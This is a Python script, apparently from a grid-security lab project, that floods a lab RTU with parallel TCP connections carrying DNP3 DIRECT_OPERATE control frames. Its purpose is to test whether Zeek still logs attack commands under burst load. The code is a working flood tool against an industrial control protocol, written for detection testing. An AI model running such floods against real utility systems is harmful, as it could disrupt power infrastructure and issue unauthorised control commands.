#!/usr/bin/env python3
"""
Phase10-0: バーストフラッド耐性実測用スクリプト。

前作(「Dockerで挑む次世代電力網構築」PowerGrid)の`attack_stage4_flood.py`/
`run_sustained_attack_for_screenshot.py`は、UDP送信・Splunk前提・物理破壊フラグ
(`trip_trigger.flag`等)という現行アーキテクチャとは非互換な設計だったため
流用しない(技術的負債#9として記録)。代わりに`Phase-ex/dnp3_frame.py`
(CRC完備・TCP・Phase-ex13本共通ユーティリティ)をベースに新規実装する。

目的：
1. 前作の実測値(16,000+ pps、Zeek CPU 96.40%飽和、パケットドロップ率35.88%)と
   比較可能な負荷を、現行ラボ(TCP、正しいDNP3 CRC)で生成する。
2. 攻撃コマンド(DIRECT_OPERATE、fc=5)自体が、フラッド中にZeek側で欠落しないか
   (dnp3.logへの記録漏れ)を実測する——検知パイプライン全体の前提を揺るがす
   問題であるため、Signal1〜9のロジック自体ではなく、「観測データがZeekに
   届くか」という、より手前の層を検証する。

設計判断(初版、smoke test後に訂正)：
- 初版は「1本のTCP接続を持続させ連続send()」という設計だったが、smoke test
  (10秒間の実行)で0.05秒/6,950フレームの時点で`ConnectionResetError`が
  発生し、即座に停止した。原因調査の結果、sub_b_rtu_hmi(target_rtu.py)・
  cc_scada_master(scada_mtu_server.py)いずれも「1接続=1回のrecv/send→即
  close()」という短命接続モデルで実装されていることが判明(正規のマスター
  ですら持続接続でフレームを連射する使い方をしていない)。持続接続への
  大量send()は、RTU側が最初のrecv(1024)しか読まずに即closeするため、
  未読データが残った状態でのclose→TCPのRST応答という形で即座に破綻する。
  これはflood_test_dnp3.py側のバグというより、「このラボのDNP3通信モデルが
  そもそも短命接続前提である」という設計事実が炙り出されたもの。
- 訂正後の設計：正規のクライアント(cc_scada_master)と同じ「接続→送信→即
  close→再接続」のサイクルを繰り返す。1接続あたり最大BATCH_SIZE本の
  フレームをまとめて送るが、送信後は応答を待たずに即座に自分からcloseする
  ため、RTU側の一発recv→closeループと衝突しない(未読データが残った状態の
  closeが発生しない)。
- 再訂正(2回目)：上記の単一スレッド・逐次connect/closeモデルで再テストした
  結果、reset/errorはゼロになり安定はしたが、TCPハンドシェイクのオーバーヘッド
  (connect()のRTT)が支配的になり、789 ppsしか出なかった(目標16,000+の
  1/20)。バッチサイズを増やす(1接続あたりの送信量を増やしハンドシェイク比率を
  下げる)だけでは、単一スレッドである以上connect()の直列実行回数がボトルネック
  であることは変わらない。そのため、複数ワーカースレッドで接続サイクルを並列化
  する(FLOOD_WORKERS本)。各ワーカーは独立したソケットでconnect->send->close
  を繰り返すため、正規クライアントと同じ「短命接続」モデルを崩さずに、
  並列度でppsを稼ぐ。バッチサイズもBATCH_SIZE=200に拡大(3,000 bytes/接続、
  RTU側のrecv(1024)は初回分しか読まないが、それ以降のデータは既にconnect
  済みソケットのカーネル送信バッファに積まれた時点でワイヤに乗るため、
  Zeek側の観測対象パケット数としては有効)。
- 目標ppsの達成有無ではなく、実際に達成できたレートを正直に計測・報告する
  ことを優先する(10-0はジェネレータの実装、精密なpps調整とZeek側の実測は10-1)。
"""

import os
import socket
import sys
import threading
import time

sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "Phase-ex"))
from dnp3_frame import build_dnp3_frame  # noqa: E402

TARGET_IP = os.environ.get("FLOOD_TARGET_IP", "10.0.30.10")
TARGET_PORT = int(os.environ.get("FLOOD_TARGET_PORT", "20000"))
DEFAULT_DURATION_SEC = 60
BATCH_SIZE = int(os.environ.get("FLOOD_BATCH_SIZE", "200"))  # 1接続あたりのフレーム数
NUM_WORKERS = int(os.environ.get("FLOOD_WORKERS", "32"))  # 並列connect->send->closeワーカー数


class Counters:
    def __init__(self):
        self.lock = threading.Lock()
        self.frames_sent = 0
        self.connections = 0
        self.reset_count = 0
        self.other_error_count = 0

    def record_ok(self, frames):
        with self.lock:
            self.connections += 1
            self.frames_sent += frames

    def record_reset(self):
        with self.lock:
            self.reset_count += 1

    def record_other_error(self):
        with self.lock:
            self.other_error_count += 1

    def snapshot(self):
        with self.lock:
            return self.frames_sent, self.connections, self.reset_count, self.other_error_count


def worker_loop(batch_payload, stop_event: threading.Event, counters: Counters):
    while not stop_event.is_set():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            s.connect((TARGET_IP, TARGET_PORT))
            s.send(batch_payload)
            # 応答は待たない。送信後、自分から即closeする(RTU側の一発recv->close
            # ループと衝突させないため、未読データを残したままのcloseを避ける)。
            s.close()
            counters.record_ok(BATCH_SIZE)
        except (BrokenPipeError, ConnectionResetError):
            counters.record_reset()
        except (socket.timeout, ConnectionRefusedError, OSError):
            counters.record_other_error()


def run_flood(duration_sec: int = DEFAULT_DURATION_SEC):
    frame = build_dnp3_frame(function_code=5)  # DIRECT_OPERATE、攻撃コマンド相当
    batch_payload = frame * BATCH_SIZE

    print("=" * 70)
    print(f"[Phase10-0] DNP3 Burst Flood Test ({duration_sec}s)")
    print(f"[+] Target: {TARGET_IP}:{TARGET_PORT}")
    print(f"[+] Frame: {frame.hex()} ({len(frame)} bytes, fc=5 DIRECT_OPERATE)")
    print(f"[+] Batch size: {BATCH_SIZE} frames/connection, {NUM_WORKERS} parallel workers "
          f"(connect->send->close cycle, matching cc_scada_master's own short-lived-connection model)")
    print("=" * 70)
    print("[+] Starting flood (parallel reconnect-per-batch)...\n")

    counters = Counters()
    stop_event = threading.Event()
    threads = [
        threading.Thread(target=worker_loop, args=(batch_payload, stop_event, counters), daemon=True)
        for _ in range(NUM_WORKERS)
    ]

    start = time.time()
    for t in threads:
        t.start()

    last_report = start
    try:
        while time.time() - start < duration_sec:
            time.sleep(0.2)
            now = time.time()
            if now - last_report >= 1.0:
                elapsed = now - start
                frames_sent, connections, reset_count, other_error_count = counters.snapshot()
                rate = frames_sent / elapsed if elapsed > 0 else 0
                remaining = duration_sec - elapsed
                print(f"[+] {frames_sent} frames sent ({connections} connections, "
                      f"{reset_count} reset, {other_error_count} other errors) | "
                      f"{rate:.0f} pps (target: 16,000+) | remaining: {remaining:.0f}s")
                last_report = now
    except KeyboardInterrupt:
        print("\n[!] Flood interrupted by user.")

    stop_event.set()
    for t in threads:
        t.join(timeout=5)

    elapsed = time.time() - start
    frames_sent, connections, reset_count, other_error_count = counters.snapshot()
    rate = frames_sent / elapsed if elapsed > 0 else 0
    print("\n" + "=" * 70)
    print(f"[+] Flood completed: {frames_sent} frames in {elapsed:.2f}s ({rate:.0f} pps)")
    print(f"[+] Connections: {connections} ok, {reset_count} reset, {other_error_count} other errors")
    if rate < 16000:
        print(f"[!] 目標(16,000+ pps)に未達。実測値をそのまま10-1の分析材料とする。")
    print("=" * 70)


if __name__ == "__main__":
    duration = int(sys.argv[1]) if len(sys.argv) > 1 else DEFAULT_DURATION_SEC
    run_flood(duration)
